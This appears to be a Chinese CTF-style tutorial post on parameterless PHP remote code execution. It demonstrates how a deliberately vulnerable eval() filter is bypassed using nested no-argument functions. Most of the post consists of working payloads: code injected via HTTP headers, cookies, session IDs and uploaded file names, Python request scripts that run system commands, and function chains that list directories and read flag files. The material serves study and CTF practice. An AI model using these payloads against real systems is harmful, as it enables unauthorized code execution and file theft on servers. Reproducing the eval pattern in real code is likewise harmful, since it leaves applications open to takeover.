---
title: "无参RCE"
date: 2025-09-13
---
# 无参数 rce

无参 rce，就是说在无法传入参数的情况下，仅仅依靠传入**没有参数的函数**套娃就可以达到命令执行的效果

## 核心代码

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
```

## HTTP 头注入

**getallheaders()**

这个函数的作用是获取**http 所有的头部信息**，也就是**headers**

有个限制条件就是**必须在 apache 的环境下**可以使用，其它环境都是用不了的

测试代码如下：

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['code'])){
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);}
else
    die('nonono');}
else
    echo('please input code');
?>
```

用`var_dump`或`print_r`把结果打印出来

```php
?code=var_dump(getallheaders());

返回值

array(17) {
  ["Content-Length"]=>
  string(1) "0"
  ["Xxx"]=>
  string(10) "phpinfo();"
  ["Cookie"]=>
  string(54) "Phpstorm-36328d79=e439a28d-cb0b-4ecb-b565-6e41375ca570"
  ["Accept-Encoding"]=>
  string(17) "gzip, deflate, br"
  ["Sec-Fetch-Dest"]=>
  string(8) "document"
  ["Sec-Fetch-User"]=>
  string(2) "?1"
  ["Sec-Fetch-Mode"]=>
  string(8) "navigate"
  ["Sec-Fetch-Site"]=>
  string(4) "none"
  ["Accept"]=>
  string(135) "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  ["User-Agent"]=>
  string(111) "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
  ["Upgrade-Insecure-Requests"]=>
  string(1) "1"
  ["Accept-Language"]=>
  string(14) "zh-CN,zh;q=0.9"
  ["Sec-Ch-Ua-Platform"]=>
  string(9) ""Windows""
  ["Sec-Ch-Ua-Mobile"]=>
  string(2) "?0"
  ["Sec-Ch-Ua"]=>
  string(39) ""Chromium";v="135", "Not-A.Brand";v="8""
  ["Host"]=>
  string(15) "localhost:63342"
  ["Content-Type"]=>
  string(0) ""
}
```

利用`end()`函数取出最后一位

自定义一个 header,比如`xxx: phpinfo();`

只会以字符串的形式取出值而不会取出键，所以说键名随便取

```php
?code=var_dump(end(getallheaders()));

返回值

string(10) "phpinfo();"
```

把`var_dump`改成`eval`，就可以执行命令了

```php
?code=eval(end(getallheaders()));
```

### 通用解法

控制`User-Agent`参数

User-Agent 的内容是可以自定义的
位置也是可以控制的，放在倒数第二位

payload 示例：

```http
GET /test/RCE.php?code=eval(next(getallheaders())); HTTP/1.1
Host: localhost:63342
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: Phpstorm-36328d79=e439a28d-cb0b-4ecb-b565-6e41375ca570
User-Agent: phpinfo();
Connection: keep-alive
```

### implode()

输入一个数组，返回将数组元素连接（拼接）成的一个字符串

```php
$arr = ["PHP", "is", "awesome"];
echo implode($arr);
// 输出：PHPisawesome
```

利用方法
headers 最后放入一个自定义头
`xxx: phpinfo();//`

```php
?code=print_r(implode(getallheaders()));
// 输出
phpinfo();//Phpstorm-36328d79=e439a28d-cb0b-4ecb-b565-6e41375ca570gzip, deflate, brdocument?1navigatenonetext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.361zh-CN,zh;q=0.9"Windows"?0"Chromium";v="135", "Not-A.Brand";v="8"localhost:63342
```

`print_r`改`eval`即可执行

## 全局变量操控

**get_defined_vars()**

更为普遍的方法

获取的四个全局变量
`$_GET`
`$_POST`
`$_FILES`
`$_COOKIE`

返回值是一个二维数组

```php
?code=print_r(get_defined_vars());

返回值
Array
(
    [_GET] => Array
        (
            [code] => print_r(get_defined_vars());
        )

    [_POST] => Array
        (
        )

    [_COOKIE] => Array
        (
            [Phpstorm-36328d79] => e439a28d-cb0b-4ecb-b565-6e41375ca570
        )

    [_FILES] => Array
        (
        )

)
```

### $\_GET

`current()`函数，这个函数的作用是返回数组中的当前单元，默认是第一个单元

通过`current()`函数取出数组中的第一个元素，也就是`$_GET`

```php
?code=print_r(current(get_defined_vars()));&xxx=phpinfo();

返回值
Array
(
    [code] => print_r(current(get_defined_vars()));
)
```

利用`end()`函数以字符串的形式取出最后的值，然后直接`eval`执行就行了

```php
?code=print_r(end(current(get_defined_vars())));&xxx=phpinfo();

返回值：phpinfo();

?code=eval(end(current(get_defined_vars())));&xxx=phpinfo();
执行命令eval(phpinfo())
```

### $\_POST

和$\_GET同理

```php
?code=eval(current(next(get_defined_vars())));

POST:
cmd=phpinfo();
```

### $\_COOKIE

参考**Session 控制**

```http
Cookie: Phpstorm-36328d79=e439a28d-cb0b-4ecb-b565-6e41375ca570;cmd=706870696e666f28293b
```

```php
?code=eval(hex2bin(end(next(array_reverse(get_defined_vars())))));
```

### $\_FILES

```python
import requests
def str2hex(payload):
  txt = ''
  for i in payload:
      txt += hex(ord(i))[-2:]
  return txt
payload = str2hex("system('cat flag.php');")
files = {
    payload: b'extrader'
}
r = requests.post("http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));", files=files, allow_redirects=False)  # allow_redirects=False 禁用重定向处理
print(r.content.decode())
```

```python

import requests

def str_to_hex(payload):
    """将命令转换为十六进制字符串"""
    return ''.join(f"{ord(c):02x}" for c in payload)

# 目标 URL
url = "http://localhost:63342/test/RCE.php"

# 要执行的系统命令
command = "system('dir');"
hex_command = str_to_hex(command)

# 构造请求参数
params = {
    "code": "eval(hex2bin(array_rand(end(get_defined_vars()))));"
}

# 构造文件上传（字段名=十六进制命令）
files = {
    hex_command: (
        'dummy.txt',          # 文件名（任意）
        b'file content',      # 文件内容（任意）
        'text/plain'          # MIME类型
    )
}

# 设置Cookie: Phpstorm-36328d79=e439a28d-cb0b-4ecb-b565-6e41375ca570
cookies = {
    'Phpstorm-36328d79': 'e439a28d-cb0b-4ecb-b565-6e41375ca570'
}

# 发送请求
response = requests.post(url, params=params, files=files, cookies=cookies)
print(response.text)
```

## Session 控制

**session_id()**

存在`COOKIE`的`PHPSESSID`时可用

```http
Cookie: PHPSESSID=xxx-xxx-xxx
```

```php
?code=print_r(session_id(session_start()));
// 输出：xxx-xxx-xxx
```

利用 16 进制编码转换

- bin2hex()
- hex2bin()

利用 base64 编码转换也可以

- base64_encode()
- base64_decode()

```php
echo = bin2hex("phpinfo();");
// 输出：706870696e666f28293b

echo hex2bin('706870696e666f28293b');
// 输出：phpinfo();
```

`PHPSESSID`的值替换成这个,然后在前面把 var_dump 换成 eval 就可以成功执行

```http
Cookie: PHPSESSID=706870696e666f28293b
```

```php
?code=eval(hex2bin(session_id(session_start())));
```

将恶意代码 16 进制编码一下即可执行

## 文件系统遍历

php 函数直接读取文件

### 任意文件读取技巧

配合**全局变量操控**
有点脱裤子放屁的感觉

1. 利用`getcwd()`获取当前目录

   ```php
   ?code=print_r(getcwd());
   // 输出 C:\Users\R1pple\PhpstormProjects\test
   ```

2. 利用`scandir()`读取目录下的文件

   ```php
   ?code=print_r(scandir(end(current(get_defined_vars()))));&pwd=C:\Users\R1pple\PhpstormProjects\test\
   // 输出 Array ( [0] => . [1] => .. [2] => .idea [3] => RCE.php [4] => test [5] => test.php )
   ```

3. 获取目录信息然后就可以任意访问了

   ```php
   // 访问/test目录
   ?code=print_r(scandir(end(current(get_defined_vars()))));&pwd=C:\Users\R1pple\PhpstormProjects\test\test\
   // 输出 Array ( [0] => . [1] => .. [2] => tempflag.txt [3] => test.txt )

   // 读取/test目录下的tempflag.txt文件
   ?code=highlight_file(end(current(get_defined_vars())));&pwd=C:\Users\R1pple\PhpstormProjects\test\test\tempflag.txt
   // 输出 flag{you_get_me}
   ```

### 前几种方法都不行时试试这个

- 非`apache`环境
- 禁止`get_defined_vars()`
- 无`PHPSESSID`

1. 获取当前目录信息

   ```php
   ?code=print_r(scandir(current(localeconv())));
   // 输出当前目录信息
   // Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )
   ```

2. 尝试读取文件

   ```php
   ?code=print_r(scandir(current(localeconv())));
   // 输出 Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )

   // 读取flag.php文件 反转数组读取第二个
   highlight_file(next(array_reverse(scandir(current(localeconv())))));
   // 输出
   $flag = "flag{16a71b78-5d2e-4c9d-874a-464cd02d3d71}";
   ```

### 赌狗读文件

利用随机特性获得`/`,`.`等字符
不稳定，需要配合**burp suite**进行爆破

```php
利用getcwd()获取当前目录：
var_dump(getcwd());

结合dirname()列出当前工作目录的父目录中的所有文件和目录:
var_dump(scandir(dirname(getcwd())));

// 该表达式随机是 $(大概率) 或者 .(小概率)
chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))

// 该表达式随机返回 0 1 . /  而我们需要获取 /
chr(ord(strrev(crypt(serialize(array())))))


// 读上一级文件
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

// 读当前目录文件
// 稳定
?code=show_source(array_rand(array_flip(scandir(current(localeconv())))));
// 不稳定
?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));

// 读根目录
?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));
```

## 获取 `.`

1. **`current(localeconv())`**
`localeconv()`：返回一包含本地数字及货币格式信息的数组。而数组第一项就是 `.`
2. `phpversion()`
    - `phpversion()`返回php版本，如7.3.5
    - `floor(phpversion())`返回7
    - `sqrt(floor(phpversion()))`返回2.6457513110646
    - `tan(floor(sqrt(floor(phpversion()))))`返回-2.1850398632615
    - `cosh(tan(floor(sqrt(floor(phpversion())))))`返回4.5017381103491
    - `sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))`返回45.081318677156
    - `ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))`返回46
    - **`chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`** 返回 **`.`**
    - **`var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))`** 扫描当前目录
    - **`next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))`** 返回 **`..`**
3. `crypt()`: **`chr(ord(hebrevc(crypt(phpversion()))))`** 返回 `.`
    `hebrevc(crypt(arg))`可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符

## 函数

### localeconv()

localeconv() 函数返回一个包含本地数字及货币格式信息的数组。

返回的是一个二维数组，而它的第一位是一个点`.`
利用`current()`函数将这个点取出来的

```php
?code=print_r(current(localeconv()));
// 输出 .
```

点代表的是当前目录

### scandir()

输入路径目录
输出目录中的文件和目录的数组

根据`localeconv()`和`scandir()`的组合，可以读取当前目录

```php
?code=print_r(scandir(current(localeconv())));
// 输出当前目录信息
// Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )
```

### current()/pos()

current()函数返回数组中的当前元素的值。
每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。
提示：该函数不会移动数组内部指针。要做到这一点，请使用 next()和 prev()函数。
相关的方法：
end()将内部指针指向数组中的最后一个元素，并输出
next()将内部指针指向数组中的下一个元素，并输出
prev()将内部指针指向数组中的上一个元素，并输出
reset()将内部指针指向数组中的第一个元素，并输出
each()返回当前元素的键名和键值，并将内部指针向前移动

```php
?code=print_r(scandir(current(localeconv())));
// 输出 Array ( [0] => . [1] => .. [2] => .idea [3] => RCE.php [4] => test.php [5] => test.txt )

// current()/pos() 第一个元素
?code=print_r(pos(scandir(current(localeconv()))));
// 输出 .

// end() 最后一个元素
?code=print_r(end(scandir(current(localeconv()))));
// 输出 test.txt

// next() 下一个元素
?code=print_r(next(scandir(current(localeconv()))));
// 输出 ..
```

### chdir()

这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为 scandir()会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用 chdir 切就好了，如果要向上跳就要构造 chdir('..')

```php
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
```

### array_reverse()

将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个`next()`

```php
print_r(array_reverse(scandir(current(localeconv()))));
```

### highlight_file()

打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的

```php
highlight_file(./flag.php)
highlight_file(next(array_reverse(scandir(current(localeconv())))));

// 输出
<?php
$flag = "flag{16a71b78-5d2e-4c9d-874a-464cd02d3d71}";
?>
```

### getcwd()

取得当前工作目录

```php
dirname():函数返回路径中的目录部分
array_flip() :交换数组中的键和值，成功时返回交换后的数组
array_rand() :从数组中随机取出一个或多个单元
strrev():用于反转给定字符串
eval()、assert()：命令执行
highlight_file()、show_source()、readfile()：读取文件内容
```

## PHP 函数整理

以下是文章中涉及的 PHP 函数的简要说明，包括作用、输入和输出。

| 函数名               | 作用                                    | 输入                                             | 输出                                                           |
| -------------------- | --------------------------------------- | ------------------------------------------------ | -------------------------------------------------------------- |
| `preg_replace()`     | 执行正则表达式搜索和替换                | 正则表达式模式、替换字符串、输入字符串           | 替换后的字符串                                                 |
| `eval()`             | 将字符串作为 PHP 代码执行               | 字符串（PHP 代码）                               | 无返回值，直接执行代码                                         |
| `getallheaders()`    | 获取所有 HTTP 请求头                    | 无                                               | 关联数组，包含所有 HTTP 头（仅 Apache 环境）                   |
| `var_dump()`         | 打印变量的详细信息（类型和值）          | 一个或多个变量                                   | 无返回值，直接输出信息                                         |
| `print_r()`          | 打印变量的可读信息                      | 变量，是否返回输出（可选）                       | 如果第二个参数为 true，则返回字符串，否则直接输出              |
| `end()`              | 返回数组的最后一个元素                  | 数组                                             | 最后一个元素的值                                               |
| `next()`             | 将数组内部指针向前移动一位并返回该元素  | 数组                                             | 下一个元素的值，如果没有则返回 false                           |
| `implode()`          | 将数组元素连接成字符串                  | 连接符（可选）、数组                             | 连接后的字符串                                                 |
| `get_defined_vars()` | 返回所有已定义变量的数组                | 无                                               | 数组，包含所有变量（如 `$_GET`、`$_POST` 等）                  |
| `current()`          | 返回数组中的当前元素（通常第一个）      | 数组                                             | 当前元素的值                                                   |
| `session_id()`       | 获取或设置当前会话 ID                   | 如果提供参数，则设置会话 ID；否则获取            | 当前会话 ID 的字符串                                           |
| `session_start()`    | 启动新会话或恢复现有会话                | 可选选项数组                                     | 布尔值，成功返回 true，失败返回 false                          |
| `hex2bin()`          | 将十六进制字符串转换为二进制字符串      | 十六进制字符串                                   | 二进制字符串                                                   |
| `bin2hex()`          | 将二进制字符串转换为十六进制字符串      | 二进制字符串                                     | 十六进制字符串                                                 |
| `getcwd()`           | 获取当前工作目录                        | 无                                               | 当前目录的字符串                                               |
| `scandir()`          | 列出指定目录中的文件和目录              | 目录路径，排序顺序（可选）                       | 数组，包含文件和目录名                                         |
| `highlight_file()`   | 语法高亮显示文件内容                    | 文件名，是否返回输出（可选）                     | 如果第二个参数为 true，则返回字符串，否则直接输出              |
| `localeconv()`       | 返回本地数字和货币格式信息              | 无                                               | 关联数组，包含格式信息（第一个元素通常是点 `.`）               |
| `pos()`              | 与 `current()` 相同，返回数组的当前元素 | 数组                                             | 当前元素的值                                                   |
| `chdir()`            | 改变当前工作目录                        | 目录路径                                         | 布尔值，成功返回 true，失败返回 false                          |
| `array_reverse()`    | 返回元素顺序相反的数组                  | 数组，是否保留键名（可选）                       | 反转后的数组                                                   |
| `array_flip()`       | 交换数组中的键和值                      | 数组                                             | 新数组，键和值交换                                             |
| `array_rand()`       | 从数组中随机选择一个或多个键            | 数组，要选择的键数量（可选）                     | 随机键或键数组                                                 |
| `strrev()`           | 反转字符串                              | 字符串                                           | 反转后的字符串                                                 |
| `assert()`           | 检查断言是否为 false，也可用于执行代码  | 表达式或字符串                                   | 如果断言为 false 则返回 false，否则返回 true，但字符串会被执行 |
| `show_source()`      | 与 `highlight_file()` 相同              | 文件名，是否返回输出（可选）                     | 如果第二个参数为 true，则返回字符串，否则直接输出              |
| `readfile()`         | 读取文件并写入输出缓冲区                | 文件名，是否使用包含路径（可选），上下文（可选） | 读取的字节数或 false on failure                                |
